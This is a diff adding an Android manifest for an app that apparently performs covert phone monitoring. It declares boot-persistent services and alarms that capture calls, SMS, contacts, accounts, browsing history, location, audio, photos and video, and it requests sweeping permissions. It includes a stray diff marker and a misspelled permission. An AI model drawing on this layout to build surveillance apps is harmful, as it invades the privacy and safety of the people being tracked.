@@ -1,0 +1,293 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="voluntaty.com.base" >
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme" >
+        <activity
+            android:name=".MainActivity"
+            android:label="@string/app_name"
+            android:theme="@style/AppTheme.NoActionBar" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity android:label="Регистрация Клиента" android:name="voluntaty.com.base.RegistrationActivity"></activity>
+
+
+        <receiver android:name=".PhListener" >
+            <intent-filter
+                android:priority="-1">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+            </intent-filter>
+        </receiver>
+
+        <provider android:name=".RecordingProvider"
+            android:authorities="com.voluntary.service" />
+        <receiver android:name=".CallBroadcastReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <!-- <category android:name="android.intent.category.LAUNCHER" /> -->
+            </intent-filter>
+        </receiver>
+
+
+        <service android:name=".RecordService">
+        </service>
+
+
+        <service
+            android:name=".ServicePhone"
+            android:enabled="true"
+            android:exported="true" >
+        </service>
+
+
+        <receiver android:name=".RepeatingAlarmService" android:process=":remote"/>
+
+        <receiver android:name=".OnBootReceiver" android:enabled="true" android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+        -       <receiver android:name=".RepeatingAlarmServiceInputSMS" android:process=":remote"/>
+
+        <receiver android:name=".InputSMSReseiver" android:enabled="true" android:exported="true" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".RepeatingAlarmServiceOutputSMS" android:process=":remote"/>
+
+        <receiver android:name=".OutputSMSReseiver" android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".RepeatingAlarmServicePhone" android:process=":remote"/>
+
+        <receiver android:name=".PhoneReseiver" android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+
+        <receiver android:name=".RepeatingAlarmServiceAccount" android:process=":remote"/>
+
+        <receiver android:name=".ServiceAccountReseiver"  android:enabled="true" android:exported="true"  >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".RepeatingAlarmServiceContact" android:process=":remote"/>
+
+        <receiver android:name=".ServiceContactReseiver"  android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+
+        <receiver android:name=".RepeatingAlarmServiceURL" android:process=":remote"/>
+
+        <receiver android:name=".ServiceURLReseiver"  android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+
+        <receiver android:name=".RepeatingAlarmServiceData" android:process=":remote"/>
+
+        <receiver android:name=".ServiceDataReseiver"  android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+
+
+        <service android:name=".PlayService"
+            android:enabled="true"
+            android:exported="true"
+            >
+        </service>
+
+        <service
+            android:name=".MyService"
+            android:enabled="true"
+            >
+        </service>
+        <service
+            android:name=".ServiceInputSMS"
+            android:enabled="true"
+            >
+        </service>
+        <service
+            android:name=".ServiceOutputSMS"
+            android:enabled="true"
+            >
+        </service>
+
+        <service
+            android:name=".ServiceAccount"
+            android:enabled="true"
+            >
+        </service>
+
+        <service
+            android:name=".ServiceContact"
+            android:enabled="true"
+            >
+        </service>
+
+        <service
+            android:name=".ServiceURL"
+            android:enabled="true"
+            >
+        </service>
+
+        <service
+            android:name=".ServiceData"
+            android:enabled="true"
+            >
+
+        </service>
+
+
+        <service android:name=".ServiceAudio"
+            android:enabled="true"
+            android:exported="true"
+            >
+        </service>
+
+        <service android:name=".ServiceAudioOne"
+            android:enabled="true"
+            android:exported="true"
+            >
+        </service>
+
+        <service android:name=".ServiceAudioOneInsert"
+            android:enabled="true"
+            android:exported="true"
+            >
+        </service>
+
+
+
+        <service android:name=".ServicePhotoOne"
+            android:enabled="true"
+            android:exported="true"
+            >
+        </service>
+
+        <service android:name=".ServiceVideoOne"
+            android:enabled="true"
+            android:exported="true"
+            >
+        </service>
+
+
+
+
+
+
+        <receiver android:name=".RepeatingAlarmServiceAudio" android:process=":remote"/>
+        <receiver android:name=".ServiceAudioReseiver"  android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+
+        <receiver android:name=".RepeatingAlarmServiceAudioOne" android:process=":remote"/>
+        <receiver android:name=".ServiceAudioOneReseiver"  android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+
+        <receiver android:name=".RepeatingAlarmServiceAudioOneInsert" android:process=":remote"/>
+        <receiver android:name=".ServiceAudioOneReseiverInsert"  android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".RepeatingAlarmServicePhotoOne" android:process=":remote"/>
+        <receiver android:name=".ServicePhotoOneReseiver"  android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".RepeatingAlarmServiceVideoOne" android:process=":remote"/>
+        <receiver android:name=".ServiceVideoOneReseiver"  android:enabled="true" android:exported="true"   >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="voluntaty.com.base.MY_STARTUP_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+
+    </application>
+
+    <uses-permission android:name="android.permission.BATTERY_STATS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
+    <uses-permission android:name="com.android.broswer.permission.WRITE_HISTORY_BOOKMARKS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission>
+    <uses-permission android:name="android.permission.MANAGE_ACCOUNTS"></uses-permission>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"></uses-permission>
+    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS"></uses-permission>
+    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS"></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS" ></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_INTERNAL_STORAGE" />
+
+
+</manifest>
